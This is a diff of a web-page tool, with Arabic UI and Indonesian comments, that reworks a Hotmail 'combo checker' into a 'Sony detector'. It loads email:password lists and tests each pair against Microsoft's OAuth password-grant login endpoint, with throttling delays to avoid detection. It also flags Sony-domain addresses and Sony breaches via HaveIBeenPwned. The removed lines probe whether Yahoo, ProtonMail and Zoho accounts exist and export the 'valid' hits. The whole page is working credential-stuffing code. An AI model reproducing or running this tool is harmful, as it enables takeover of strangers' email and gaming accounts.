@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hotmail All-in-One — Checker + Inbox + Sony Detector</title>
+<title>Sony Detector — Tanpa OAuth (List Only)</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family:'Tahoma','Segoe UI',monospace; background:#0a0a0a; color:#00ff41; min-height:100vh; padding:20px; }
@@ -11,16 +11,9 @@
   h1 { font-size: 20px; margin-bottom: 4px; letter-spacing: 1px; }
   h2 { font-size: 14px; color: #ffaa00; margin: 18px 0 8px; letter-spacing: 1px; }
   .sub { color:#666; font-size:11px; margin-bottom:16px; }
-  .tabs { display: flex; gap: 4px; margin-bottom: 14px; flex-wrap: wrap; }
-  .tab { background:#1a1a1a; color:#888; border:1px solid #222; padding:8px 16px; cursor:pointer; font-family:inherit; font-size:12px; }
-  .tab.active { background:#00ff41; color:#000; border-color:#00ff41; font-weight:bold; }
-  .tab:hover:not(.active) { color:#00ff41; }
-  .panel { display: none; }
-  .panel.active { display: block; }
-
   label { display:block; font-size:11px; color:#888; margin:10px 0 4px; }
-  textarea, input[type=text], input[type=email] { width:100%; background:#111; color:#00ff41; border:1px solid #222; padding:9px; font-family:inherit; font-size:12px; outline:none; }
-  textarea { height:120px; resize:vertical; }
+  textarea, input[type=text] { width:100%; background:#111; color:#00ff41; border:1px solid #222; padding:9px; font-family:inherit; font-size:12px; outline:none; }
+  textarea { height:150px; resize:vertical; }
   textarea:focus, input:focus { border-color:#00ff41; }
   .dropzone { border:2px dashed #222; background:#0d0d0d; padding:22px; text-align:center; border-radius:6px; cursor:pointer; transition:all .2s; margin-bottom:10px; }
   .dropzone:hover, .dropzone.drag { border-color:#00ff41; background:#0f1a0f; }
@@ -31,7 +24,7 @@
   .dropzone .file-info.show { display:block; }
   input[type=file] { display:none; }
 
-  .row { display:flex; gap:8px; margin:10px 0; flex-wrap:wrap; }
+  .row { display:flex; gap:8px; margin:10px 0; flex-wrap:wrap; align-items:center; }
   button { background:#00ff41; color:#000; border:none; padding:9px 20px; font-family:inherit; font-weight:bold; cursor:pointer; letter-spacing:1px; font-size:12px; }
   button:hover { background:#00cc33; }
   button:disabled { background:#333; color:#666; cursor:not-allowed; }
@@ -44,378 +37,134 @@
   .counter-box .val { font-size:22px; font-weight:bold; line-height:1; }
   .counter-box .lbl { font-size:9px; color:#666; margin-top:4px; letter-spacing:1px; }
   .counter-box.total .val { color:#ffaa00; }
-  .counter-box.valid .val { color:#00ff41; }
-  .counter-box.locked .val { color:#00ccff; }
-  .counter-box.invalid .val { color:#ff3333; }
-  .counter-box.unknown .val { color:#888; }
+  .counter-box.sony-dom .val { color:#ff3333; }
+  .counter-box.sony-breach .val { color:#ff66cc; }
+  .counter-box.sony-valid .val { color:#00ccff; }
   .counter-box.cpm .val { color:#ff66cc; }
-  .counter-box.sony .val { color:#ff3333; }
 
-  .progress-wrap { background:#111; border:1px solid #1a1a1a; height:18px; border-radius:3px; overflow:hidden; margin:10px 0; position:relative; }
-  .progress-fill { height:100%; background:linear-gradient(90deg,#00ff41,#00cc33); width:0%; transition:width .15s; }
-  .progress-text { position:absolute; inset:0; text-align:center; font-size:11px; line-height:18px; color:#000; font-weight:bold; mix-blend-mode:difference; }
-
-  #log { background:#050505; border:1px solid #1a1a1a; padding:10px; height:340px; overflow-y:auto; font-size:11px; line-height:1.7; margin-top:10px; white-space:pre-wrap; }
-  .l-valid { color:#00ff41; }
-  .l-locked { color:#00ccff; }
-  .l-invalid { color:#ff3333; }
+  #log { background:#050505; border:1px solid #1a1a1a; padding:10px; height:300px; overflow-y:auto; font-size:11px; line-height:1.7; margin-top:10px; white-space:pre-wrap; }
+  .l-sony-dom { color:#ff3333; font-weight:bold; }
+  .l-sony-breach { color:#ff66cc; }
+  .l-sony-valid { color:#00ccff; font-weight:bold; }
+  .l-clean { color:#666; }
   .l-info { color:#ffaa00; }
   .l-muted { color:#555; }
-  .l-unknown { color:#888; }
-  .l-detect { color:#ff66cc; }
-  .l-sony { color:#ff3333; font-weight:bold; }
+  .l-error { color:#ff3333; }
 
-  .legend { display:flex; gap:14px; flex-wrap:wrap; font-size:10px; color:#666; margin-top:6px; }
-  .legend b { color:#00ff41; }
+  #results { margin-top: 10px; }
+  .result-card { background:#0d0d0d; border:1px solid #1a1a1a; padding:10px; margin:6px 0; border-radius:4px; font-size:11px; }
+  .result-card.sony-dom { border-color:#ff3333; background:#1a0a0a; }
+  .result-card.sony-breach { border-color:#ff66cc; background:#1a0a1a; }
+  .result-card.sony-valid { border-color:#00ccff; background:#0a1a1a; }
+  .result-card .email { color:#00ff41; font-weight:bold; }
+  .result-card .badge { display:inline-block; padding:1px 6px; border-radius:3px; font-size:9px; margin-left:6px; color:#fff; }
+  .badge.dom { background:#ff3333; }
+  .badge.breach { background:#ff66cc; }
+  .badge.valid { background:#00ccff; }
+  .badge.none { background:#333; color:#888; }
+  .result-card .detail { color:#888; font-size:10px; margin-top:4px; }
 
-  .inbox-card { background:#0d0d0d; border:1px solid #1a1a1a; padding:10px; margin:6px 0; border-radius:4px; font-size:11px; }
-  .inbox-card.sony { border-color:#ff3333; background:#1a0a0a; }
-  .inbox-card .from { color:#00ccff; }
-  .inbox-card .subject { color:#00ff41; font-weight:bold; }
-  .inbox-card .date { color:#666; font-size:10px; }
-  .inbox-card .badge { display:inline-block; background:#ff3333; color:#fff; padding:1px 6px; border-radius:3px; font-size:9px; margin-left:6px; }
-  .inbox-card .evidence { color:#888; font-size:10px; margin-top:4px; }
-
-  .accounts-list { background:#0d0d0d; border:1px solid #1a1a1a; padding:8px; margin:8px 0; font-size:11px; }
-  .accounts-list .acct { display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #1a1a1a; }
-  .accounts-list .acct:last-child { border-bottom:none; }
+  .note { background:#1a1a0d; border:1px solid #333300; padding:10px; font-size:11px; color:#ffaa00; margin:10px 0; border-radius:4px; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>[ HOTMAIL ALL-IN-ONE ]</h1>
-  <div class="sub">checker + inbox + Sony detector — semua di satu halaman</div>
+  <h1>[ SONY DETECTOR — بدون ربط ]</h1>
+  <div class="sub">كشف Sony من الدومين + HIBP breach + password valid — بدون OAuth/consent</div>
 
-  <div class="tabs">
-    <div class="tab active" data-tab="tab-checker">1. فحص Combo</div>
-    <div class="tab" data-tab="tab-inbox">2. فحص Inbox + Sony</div>
+  <div class="note">
+    <b>ملاحظة:</b> بدون OAuth لا يمكن قراءة محتوى inbox. هذا الكاشف يستخدم 3 طبقات فقط:
+    <br>1. <b>دومين Sony</b> (email @sony.com/@playstation.com = موظف/رسمي)
+    <br>2. <b>HIBP breach</b> (البريد ظهر في اختراق Sony 2011/2014)
+    <br>3. <b>password valid</b> (من فحص OAuth password grant)
   </div>
 
-  <!-- ========== TAB 1: CHECKER ========== -->
-  <div class="panel active" id="tab-checker">
-    <h2>فحص Combo Password</h2>
+  <div class="dropzone" id="dropzone">
+    <div class="icon">📁</div>
+    <div class="txt">اضغط أو <b>اسحب وأفلت</b> ملف .txt هنا</div>
+    <div class="txt" style="font-size:10px;margin-top:4px">صيغة: email:password — سطر واحد لكل حساب</div>
+    <div class="file-info" id="fileInfo"></div>
+  </div>
+  <input type="file" id="fileInput" accept=".txt,.text,text/plain">
 
-    <div class="dropzone" id="dropzone">
-      <div class="icon">📁</div>
-      <div class="txt">اضغط أو <b>اسحب وأفلت</b> ملف .txt هنا</div>
-      <div class="txt" style="font-size:10px;margin-top:4px">صيغة: email:password — سطر واحد لكل حساب</div>
-      <div class="file-info" id="fileInfo"></div>
-    </div>
-    <input type="file" id="fileInput" accept=".txt,.text,text/plain">
+  <label>أو الصق القائمة يدويًا</label>
+  <textarea id="manualInput" placeholder="user@hotmail.com:pass&#10;user@sony.com:pass&#10;user@playstation.com:pass"></textarea>
 
-    <label>أو الصق القائمة يدويًا</label>
-    <textarea id="manualInput" placeholder="user@hotmail.com:pass&#10;user@outlook.com:pass"></textarea>
+  <label>HIBP API Key (اختياري — بدونه يُستخدم endpoint عام محدود)</label>
+  <input type="text" id="hibpKey" placeholder="isi API key dari haveibeenpwned.com/API/Key">
 
-    <div class="row">
-      <button id="startBtn" onclick="startCheck()" disabled>ابدأ فحص Combo</button>
-      <button class="alt" onclick="exportValid()" id="exportBtn" disabled>نسخ الصالح</button>
-      <button class="alt" onclick="resetAll()">إعادة تعيين</button>
-    </div>
-
-    <div class="counter-panel">
-      <div class="counter-box total"><div class="val" id="cTotal">0</div><div class="lbl">الإجمالي</div></div>
-      <div class="counter-box valid"><div class="val" id="cValid">0</div><div class="lbl">صالح</div></div>
-      <div class="counter-box locked"><div class="val" id="cLocked">0</div><div class="lbl">مقفل</div></div>
-      <div class="counter-box invalid"><div class="val" id="cInvalid">0</div><div class="lbl">خاطئ</div></div>
-      <div class="counter-box unknown"><div class="val" id="cUnknown">0</div><div class="lbl">غير مدعوم</div></div>
-      <div class="counter-box cpm"><div class="val" id="cCpm">0</div><div class="lbl">CPM</div></div>
-    </div>
-
-    <div class="progress-wrap">
-      <div class="progress-fill" id="progFill"></div>
-      <div class="progress-text" id="progText">0 / 0</div>
-    </div>
-
-    <div class="legend">
-      <span><b>✓ صالح</b> — كلمة المرور صحيحة</span>
-      <span><b>🔒 مقفل</b> — صحيحة لكن يحتاج تحقق</span>
-      <span><b>✗ خاطئ</b> — كلمة المرور غلط</span>
-      <span><b>? غير مدعوم</b> — لا endpoint</span>
-    </div>
-
-    <div id="log"></div>
+  <div class="row">
+    <button id="startBtn" onclick="startScan()">🔍 ابدأ كشف Sony</button>
+    <button class="alt" onclick="exportSony()" id="exportBtn" disabled>نسخ قائمة Sony</button>
+    <button class="alt" onclick="resetAll()">إعادة تعيين</button>
   </div>
 
-  <!-- ========== TAB 2: INBOX + SONY ========== -->
-  <div class="panel" id="tab-inbox">
-    <h2>فحص Inbox + كشف Sony</h2>
-    <div class="sub" style="margin-bottom:10px">
-      بقراءة inbox عبر Microsoft Graph — يحتاج تسجيل دخول يدوي مرة واحدة لكل حساب (consent). لا يمكن أتمتته من قائمة combo.
-    </div>
-
-    <label>Client ID (من Azure App Registration — اتركه فارغًا لاستخدام العام)</label>
-    <input type="text" id="clientIdInput" placeholder="0000000040170455" value="d3590ed6-52b3-4102-aeff-aad2292ab01c">
-
-    <label>Redirect URI (يجب أن يطابق Azure App)</label>
-    <input type="text" id="redirectUriInput" value="http://localhost:8080/index.html">
-
-    <div class="row">
-      <button onclick="startOAuth()">🔐 ربط حساب Hotmail</button>
-      <button class="alt" onclick="loadAccountsList()">تحديث القائمة</button>
-      <button class="alt" onclick="clearAccounts()">مسح كل الحسابات</button>
-    </div>
-
-    <div class="accounts-list" id="accountsList">
-      <div class="acct">لا توجد حسابات مرتبطة بعد</div>
-    </div>
-
-    <div class="row">
-      <button onclick="scanInbox()" id="scanBtn" disabled>📬 فحص Inbox + كشف Sony</button>
-    </div>
-
-    <div class="counter-panel">
-      <div class="counter-box total"><div class="val" id="iTotal">0</div><div class="lbl">رسائل</div></div>
-      <div class="counter-box unseen"><div class="val" id="iUnseen">0</div><div class="lbl">غير مقروءة</div></div>
-      <div class="counter-box sony"><div class="val" id="iSony">0</div><div class="lbl">Sony</div></div>
-    </div>
-
-    <div id="inboxResults"></div>
+  <div class="counter-panel">
+    <div class="counter-box total"><div class="val" id="cTotal">0</div><div class="lbl">الإجمالي</div></div>
+    <div class="counter-box sony-dom"><div class="val" id="cSonyDom">0</div><div class="lbl">دومين Sony</div></div>
+    <div class="counter-box sony-breach"><div class="val" id="cSonyBreach">0</div><div class="lbl">Breach Sony</div></div>
+    <div class="counter-box sony-valid"><div class="val" id="cSonyValid">0</div><div class="lbl">Sony + صالح</div></div>
   </div>
+
+  <div id="log"></div>
+  <div id="results"></div>
 </div>
 
 <script>
 // ============================================================
-// KONFIGURASI GLOBAL
+// Sony Detector — tanpa OAuth
+// 1. Domain match (sony.com, playstation.com, dll)
+// 2. HIBP breach check (Sony 2011 PSN, 2014 Pictures)
+// 3. Password valid via OAuth password grant
 // ============================================================
 
 const CONFIG = {
-  // Checker password
   msClientId: '0000000040170455',
   tokenUrl: 'https://login.live.com/oauth20_token.srf',
   scope: 'service::outlook.office.com::MBI_SSL',
   concurrency: 2,
-  delayMin: 1500,
-  delayMax: 3500,
-  maxRetry: 2,
-  enableDnsLookup: true,
-  dnsTimeoutMs: 4000
+  delayMin: 1200,
+  delayMax: 2500,
+  hibpDelayMs: 1600  // HIBP rate limit 1 req per 1.5s tanpa key
 };
 
-// Sony patterns
-const SONY_PATTERNS = {
-  senderDomains: [
-    /(^|@)sony\.com$/i, /(^|@)sony\.net$/i, /(^|@)sony\.co\.jp$/i,
-    /(^|@)sony\.co\.uk$/i, /(^|@)sony\.de$/i, /(^|@)sony\.fr$/i,
-    /(^|@)sony\.it$/i, /(^|@)sony\.es$/i, /(^|@)sony\.com\.br$/i,
-    /(^|@)sony\.com\.au$/i, /(^|@)sony\.co\.in$/i, /(^|@)sony\.asia$/i,
-    /(^|@)playstation\.com$/i, /(^|@)playstation\.net$/i,
-    /(^|@)sonyentertainmentnetwork\.com$/i,
-    /(^|@)sonypictures\.com$/i, /(^|@)sonymusic\.com$/i,
-    /(^|@)sonymusicentertainment\.com$/i, /(^|@)sonybank\.net$/i,
-    /(^|@)sonylife\.co\.jp$/i, /(^|@)sonyfinancialholdings\.com$/i,
-    /(^|@)sony\.com\.tr$/i, /(^|@)sony\.com\.mx$/i,
-    /(^|@)sony\.com\.sg$/i, /(^|@)sony\.com\.hk$/i,
-    /(^|@)sony\.co\.kr$/i, /(^|@)sony\.co\.th$/i,
-    /(^|@)sony\.co\.id$/i, /(^|@)sony\.com\.ph$/i,
-    /(^|@)sony\.com\.my$/i, /(^|@)sony\.com\.vn$/i,
-    /(^|@)email\.sony\.com$/i, /(^|@)account\.sony\.com$/i,
-    /(^|@)account\.sony\.net$/i, /(^|@)store\.sony\.com$/i,
-    /(^|@)store\.playstation\.com$/i, /(^|@)mail\.playstation\.com$/i,
-    /(^|@)mail\.sony\.com$/i, /(^|@)news\.sony\.com$/i,
-    /(^|@)info\.sony\.com$/i, /(^|@)no-reply\.sony\.com$/i,
-    /(^|@)noreply\.sony\.com$/i, /(^|@)cr\.sony\.com$/i,
-    /(^|@)member\.sony\.com$/i, /(^|@)id\.sony\.com$/i,
-    /(^|@)auth\.sony\.com$/i
-  ],
-  keywords: [
-    /\bSony\b/i, /\bPlayStation\b/i, /\bPSN\b/i,
-    /\bPlayStation\s*Plus\b/i, /\bPlayStation\s*Network\b/i,
-    /\bPS\s*Plus\b/i, /\bPS5\b/, /\bPS4\b/, /\bPSVR\b/i,
-    /\bSony\s*Rewards\b/i, /\bSony\s*Pictures\b/i,
-    /\bSony\s*Music\b/i, /\bSony\s*Bank\b/i,
-    /\bSony\s*Financial\b/i, /\bSony\s*Store\b/i,
-    /\bSony\s*Entertainment\b/i, /\bSony\s*Interactive\b/i,
-    /\bSony\s*Mobile\b/i, /\bSony\s*Xperia\b/i,
-    /\bXperia\b/i, /\bSony\s*Alpha\b/i,
-    /\bSony\s*Bravia\b/i, /\bBravia\b/i,
-    /\bSony\s*WH-1000XM/i, /\bSony\s*WF-1000XM/i,
-    /\bCrunchyroll\b/i, /\bPlayStation\s*Direct\b/i,
-    /\bPlayStation\s*Store\b/i, /\bPS\s*Store\b/i
-  ]
-};
-
-const SCORE = {
-  senderDomain: 50, senderName: 20, subject: 15, body: 5, linkSony: 10
-};
-
-// Provider registry
-const PROVIDERS = [
-  { name:'Microsoft', patterns:[/^(hotmail|outlook|live|msn)\./i, /^hotmail\.com$/i, /^outlook\.com$/i, /^live\.com$/i], check: checkMicrosoft },
-  { name:'Yahoo', patterns:[/^(yahoo|ymail|rocketmail)\./i], check: checkYahoo },
-  { name:'Google', patterns:[/^gmail\.com$/i, /^googlemail\.com$/i], check: checkGoogle },
-  { name:'ProtonMail', patterns:[/^protonmail\.com$/i, /^proton\.me$/i, /^pm\.me$/i], check: checkProton },
-  { name:'Zoho', patterns:[/(^|\.)zoho\.com$/i, /^zohomail\.com$/i], check: checkZoho },
-  { name:'Yandex', patterns:[/^yandex\.(com|ru)$/i, /^ya\.ru$/i], check: checkUnsupported('Yandex') },
-  { name:'Mail.ru', patterns:[/^mail\.ru$/i, /^inbox\.ru$/i, /^bk\.ru$/i, /^list\.ru$/i], check: checkUnsupported('Mail.ru') },
-  { name:'iCloud', patterns:[/^icloud\.com$/i, /^me\.com$/i, /^mac\.com$/i], check: checkUnsupported('iCloud') },
-  { name:'AOL', patterns:[/^aol\.(com|co\.uk)$/i], check: checkUnsupported('AOL') },
-  { name:'GMX', patterns:[/^gmx\.(com|net|at|ch)$/i, /^web\.de$/i], check: checkUnsupported('GMX/Web.de') },
-  { name:'Mail.com', patterns:[/^mail\.com$/i], check: checkUnsupported('Mail.com') }
+// Domain Sony resmi
+const SONY_DOMAINS = [
+  /(^|@)sony\.com$/i, /(^|@)sony\.net$/i, /(^|@)sony\.co\.jp$/i,
+  /(^|@)sony\.co\.uk$/i, /(^|@)sony\.de$/i, /(^|@)sony\.fr$/i,
+  /(^|@)sony\.it$/i, /(^|@)sony\.es$/i, /(^|@)sony\.com\.br$/i,
+  /(^|@)sony\.com\.au$/i, /(^|@)sony\.co\.in$/i, /(^|@)sony\.asia$/i,
+  /(^|@)playstation\.com$/i, /(^|@)playstation\.net$/i,
+  /(^|@)sonyentertainmentnetwork\.com$/i,
+  /(^|@)sonypictures\.com$/i, /(^|@)sonymusic\.com$/i,
+  /(^|@)sonymusicentertainment\.com$/i, /(^|@)sonybank\.net$/i,
+  /(^|@)sonylife\.co\.jp$/i, /(^|@)sonyfinancialholdings\.com$/i,
+  /(^|@)sony\.com\.tr$/i, /(^|@)sony\.com\.mx$/i,
+  /(^|@)sony\.com\.sg$/i, /(^|@)sony\.com\.hk$/i,
+  /(^|@)sony\.co\.kr$/i, /(^|@)sony\.co\.th$/i,
+  /(^|@)sony\.co\.id$/i, /(^|@)sony\.com\.ph$/i,
+  /(^|@)sony\.com\.my$/i, /(^|@)sony\.com\.vn$/i,
+  /(^|@)email\.sony\.com$/i, /(^|@)account\.sony\.com$/i,
+  /(^|@)account\.sony\.net$/i, /(^|@)store\.sony\.com$/i,
+  /(^|@)store\.playstation\.com$/i, /(^|@)mail\.playstation\.com$/i,
+  /(^|@)mail\.sony\.com$/i, /(^|@)news\.sony\.com$/i,
+  /(^|@)info\.sony\.com$/i, /(^|@)no-reply\.sony\.com$/i,
+  /(^|@)noreply\.sony\.com$/i, /(^|@)cr\.sony\.com$/i,
+  /(^|@)member\.sony\.com$/i, /(^|@)id\.sony\.com$/i,
+  /(^|@)auth\.sony\.com$/i
 ];
 
-const MX_MAP = [
-  { mx:/outlook|hotmail|live\.com|protection\.outlook/i, provider:'Microsoft' },
-  { mx:/yahoodns|yahoo/i, provider:'Yahoo' },
-  { mx:/google|gmail|googlemail|aspmx/i, provider:'Google' },
-  { mx:/protonmail|proton\.me/i, provider:'ProtonMail' },
-  { mx:/zoho/i, provider:'Zoho' },
-  { mx:/yandex/i, provider:'Yandex' },
-  { mx:/mail\.ru|inbox\.ru/i, provider:'Mail.ru' },
-  { mx:/icloud|apple/i, provider:'iCloud' },
-  { mx:/aol/i, provider:'AOL' },
-  { mx:/gmx|web\.de/i, provider:'GMX' },
-  { mx:/mail\.com/i, provider:'Mail.com' }
+// Nama breach Sony yang dikenal
+const SONY_BREACH_NAMES = [
+  /sony/i, /playstation/i, /psn/i, /sony.?pictures/i,
+  /sony.?online.?entertainment/i, /soney/i  // typo di HIBP kadang
 ];
-
-const DOMAIN_CACHE = new Map();
-
-// ============================================================
-// CHECK FUNCTIONS
-// ============================================================
-
-async function checkMicrosoft(email, pass) {
-  const body = new URLSearchParams({
-    client_id: CONFIG.msClientId,
-    scope: CONFIG.scope,
-    grant_type: 'password',
-    username: email,
-    password: pass
-  });
-  const res = await fetch(CONFIG.tokenUrl, {
-    method:'POST',
-    headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
-    body: body.toString()
-  });
-  const text = await res.text();
-  let data = {}; try { data = JSON.parse(text); } catch {}
-  if (res.status === 200 && data.access_token) return { status:'valid' };
-  if (data.error) {
-    const e = String(data.error).toLowerCase();
-    const d = String(data.error_description||'').toLowerCase();
-    if (e.includes('interaction_required') || d.includes('locked') || d.includes('verify') || d.includes('unusual activity'))
-      return { status:'locked', note: data.error_description };
-    return { status:'invalid', note: data.error_description };
-  }
-  return { status:'invalid', note:'unknown response' };
-}
-
-async function checkYahoo(email) {
-  try {
-    const res = await fetch('https://login.yahoo.com/account/module/create?validateField=userId', {
-      method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
-      body:`userId=${encodeURIComponent(email.split('@')[0])}`
-    });
-    const text = await res.text();
-    if (/not available|already taken/i.test(text)) return { status:'locked', note:'account exists (password not verified)' };
-    return { status:'invalid', note:'account not found' };
-  } catch (e) { return { status:'error', note: e.message }; }
-}
-
-async function checkGoogle() { return { status:'unknown', note:'Google يمنع password grant' }; }
-
-async function checkProton(email) {
-  try {
-    const res = await fetch('https://mail.protonmail.com/api/auth/info', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ Username: email })
-    });
-    const data = await res.json().catch(()=>({}));
-    if (res.status === 200 && data.Code === 1000) return { status:'locked', note:'account exists — SRP required' };
-    return { status:'invalid', note:'account not found' };
-  } catch (e) { return { status:'error', note: e.message }; }
-}
-
-async function checkZoho(email) {
-  try {
-    const res = await fetch('https://accounts.zoho.com/signin/v2/lookup/' + encodeURIComponent(email), {
-      method:'GET', headers:{'Accept':'application/json'}
-    });
-    if (res.status === 200) return { status:'locked', note:'account exists' };
-    return { status:'invalid', note:'not found' };
-  } catch (e) { return { status:'error', note: e.message }; }
-}
-
-function checkUnsupported(name) {
-  return async () => ({ status:'unknown', note:`${name} — لا endpoint فحص` });
-}
-
-// ============================================================
-// RESOLVER
-// ============================================================
-
-function matchPattern(domain) {
-  for (const p of PROVIDERS) for (const re of p.patterns) if (re.test(domain)) return p;
-  return null;
-}
-
-async function dnsQuery(domain, type) {
-  const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`;
-  const ctrl = new AbortController();
-  const timer = setTimeout(() => ctrl.abort(), CONFIG.dnsTimeoutMs);
-  try {
-    const res = await fetch(url, { signal: ctrl.signal });
-    clearTimeout(timer);
-    if (!res.ok) return [];
-    const data = await res.json();
-    return (data.Answer || []).map(a => String(a.data || '').toLowerCase());
-  } catch { clearTimeout(timer); return []; }
-}
-
-async function resolveProvider(domain) {
-  domain = domain.toLowerCase();
-  if (DOMAIN_CACHE.has(domain)) return DOMAIN_CACHE.get(domain);
-
-  const pat = matchPattern(domain);
-  if (pat) {
-    const result = { provider: pat.name, check: pat.check, method: 'pattern' };
-    DOMAIN_CACHE.set(domain, result);
-    return result;
-  }
-
-  if (CONFIG.enableDnsLookup) {
-    const mxList = await dnsQuery(domain, 'MX');
-    if (mxList.length) {
-      for (const mx of mxList) {
-        for (const map of MX_MAP) {
-          if (map.mx.test(mx)) {
-            const entry = PROVIDERS.find(p => p.name === map.provider);
-            if (entry) {
-              const checkFn = map.provider === 'Microsoft' ? checkMicrosoft : entry.check;
-              const result = { provider: `${entry.name} (MX)`, check: checkFn, method: 'dns-mx', mx };
-              DOMAIN_CACHE.set(domain, result);
-              return result;
-            }
-          }
-        }
-      }
-      const result = { provider: `Custom (${mxList[0].slice(0,40)})`, check: checkUnsupported('مزوّد مخصص'), method: 'dns-mx', mx: mxList[0] };
-      DOMAIN_CACHE.set(domain, result);
-      return result;
-    }
-  }
-
-  const result = { provider: '?', check: checkUnsupported('دومين غير معروف'), method: 'none' };
-  DOMAIN_CACHE.set(domain, result);
-  return result;
-}
-
-// ============================================================
-// STATE + LOG
-// ============================================================
-
-const TLD_COUNTRY = {
-  'id':'إندونيسيا','uk':'بريطانيا','de':'ألمانيا','fr':'فرنسا','jp':'اليابان','kr':'كوريا','cn':'الصين','ru':'روسيا','br':'البرازيل','in':'الهند','au':'أستراليا','ca':'كندا','mx':'المكسيك','es':'إسبانيا','it':'إيطاليا','nl':'هولندا','pl':'بولندا','tr':'تركيا','sa':'السعودية','ae':'الإمارات','eg':'مصر','my':'ماليزيا','sg':'سنغافورة','th':'تايلاند','vn':'فيتنام','ph':'الفلبين','ng':'نيجيريا','za':'جنوب أفريقيا','ar':'الأرجنتين','cl':'تشيلي','co':'كولومبيا','ir':'إيران','iq':'العراق','sy':'سوريا','lb':'لبنان','jo':'الأردن','kw':'الكويت','qa':'قطر','bh':'البحرين','om':'عمان','ye':'اليمن','pk':'باكستان','bd':'بنغلاديش','lk':'سريلانكا'
-};
 
 let running = false;
-let stats = { total:0, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
 let queue = [];
-
+let results = [];  // { email, pass, sonyDom, sonyBreach, breachList, valid }
 const logEl = document.getElementById('log');
-const dropzone = document.getElementById('dropzone');
-const fileInput = document.getElementById('fileInput');
-const fileInfo = document.getElementById('fileInfo');
-const startBtn = document.getElementById('startBtn');
+const resultsEl = document.getElementById('results');
 
 function log(msg, cls='') {
   const t = new Date().toLocaleTimeString('en-GB');
@@ -426,30 +175,67 @@ function log(msg, cls='') {
   logEl.scrollTop = logEl.scrollHeight;
 }
 
-function updateCounters() {
-  document.getElementById('cTotal').textContent = stats.total;
-  document.getElementById('cValid').textContent = stats.valid;
-  document.getElementById('cLocked').textContent = stats.locked;
-  document.getElementById('cInvalid').textContent = stats.invalid;
-  document.getElementById('cUnknown').textContent = stats.unknown;
-  const elapsed = (Date.now() - stats.startTime)/1000;
-  document.getElementById('cCpm').textContent = elapsed > 1 ? Math.round((stats.done/elapsed)*60) : 0;
-  const pct = stats.total ? (stats.done/stats.total)*100 : 0;
-  document.getElementById('progFill').style.width = pct + '%';
-  document.getElementById('progText').textContent = `${stats.done} / ${stats.total}`;
-}
-
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-function randDelay() { return CONFIG.delayMin + Math.random()*(CONFIG.delayMax-CONFIG.delayMin); }
 
-function detectCountry(email) {
-  const domain = (email.split('@')[1]||'').toLowerCase();
-  const tld = domain.split('.').pop();
-  if (TLD_COUNTRY[tld]) return tld.toUpperCase();
-  if (['com','net','org'].includes(tld)) return '—';
-  return tld.toUpperCase();
+function checkSonyDomain(email) {
+  const addr = email.toLowerCase();
+  for (const re of SONY_DOMAINS) {
+    if (re.test(addr)) return true;
+  }
+  return false;
 }
 
+// ---- HIBP breach check ----
+async function checkHibp(email) {
+  const key = document.getElementById('hibpKey').value.trim();
+  const headers = { 'User-Agent': 'SonyDetector/1.0', 'hibp-api-version': '3' };
+  if (key) headers['hibp-api-key'] = key;
+
+  try {
+    const res = await fetch(
+      `https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=false`,
+      { headers }
+    );
+    if (res.status === 404) return { breached: false, breaches: [] };
+    if (res.status === 401) return { error: 'API key invalid / diperlukan', breaches: [] };
+    if (res.status === 429) return { error: 'rate-limited (tanpa key max 1 req/1.5s)', breaches: [] };
+    if (!res.ok) return { error: `HTTP ${res.status}`, breaches: [] };
+    const data = await res.json();
+    const breaches = (data || []).map(b => b.Name || b.Title || '');
+    const sonyBreaches = breaches.filter(b => SONY_BREACH_NAMES.some(re => re.test(b)));
+    return { breached: breaches.length > 0, sonyBreach: sonyBreaches.length > 0, breaches, sonyBreaches };
+  } catch (e) {
+    return { error: e.message, breaches: [] };
+  }
+}
+
+// ---- OAuth password check ----
+async function checkPassword(email, pass) {
+  const body = new URLSearchParams({
+    client_id: CONFIG.msClientId,
+    scope: CONFIG.scope,
+    grant_type: 'password',
+    username: email,
+    password: pass
+  });
+  try {
+    const res = await fetch(CONFIG.tokenUrl, {
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
+      body: body.toString()
+    });
+    const text = await res.text();
+    let data = {}; try { data = JSON.parse(text); } catch {}
+    if (res.status === 200 && data.access_token) return { valid: true };
+    const err = String(data.error || '').toLowerCase();
+    if (err.includes('invalid_client')) return { valid: false, error: 'client_id deprecated' };
+    return { valid: false };
+  } catch (e) {
+    return { valid: false, error: e.message };
+  }
+}
+
+// ---- parse input ----
 function parseLine(line) {
   line = line.trim(); if (!line) return null;
   const idx = line.indexOf(':'); if (idx === -1) return null;
@@ -459,17 +245,30 @@ function parseLine(line) {
   return { email, pass };
 }
 
-// ============================================================
-// FILE HANDLING
-// ============================================================
+// ---- file upload ----
+document.getElementById('dropzone').addEventListener('click', () => document.getElementById('fileInput').click());
+document.getElementById('fileInput').addEventListener('change', e => {
+  const f = e.target.files[0]; if (f) handleFile(f);
+});
+['dragenter','dragover'].forEach(ev => document.getElementById('dropzone').addEventListener(ev, e => {
+  e.preventDefault(); e.stopPropagation();
+  document.getElementById('dropzone').classList.add('drag');
+}));
+['dragleave','drop'].forEach(ev => document.getElementById('dropzone').addEventListener(ev, e => {
+  e.preventDefault(); e.stopPropagation();
+  document.getElementById('dropzone').classList.remove('drag');
+}));
+document.getElementById('dropzone').addEventListener('drop', e => {
+  const f = e.dataTransfer.files[0]; if (f) handleFile(f);
+});
 
 function handleFile(file) {
-  if (!file || running) return;
-  if (file.size > 20*1024*1024) { log('ملف كبير جدًا', 'l-invalid'); return; }
-  fileInfo.textContent = `📄 ${file.name} — ${(file.size/1024).toFixed(1)} KB`;
-  fileInfo.classList.add('show');
+  if (running) return;
+  const fi = document.getElementById('fileInfo');
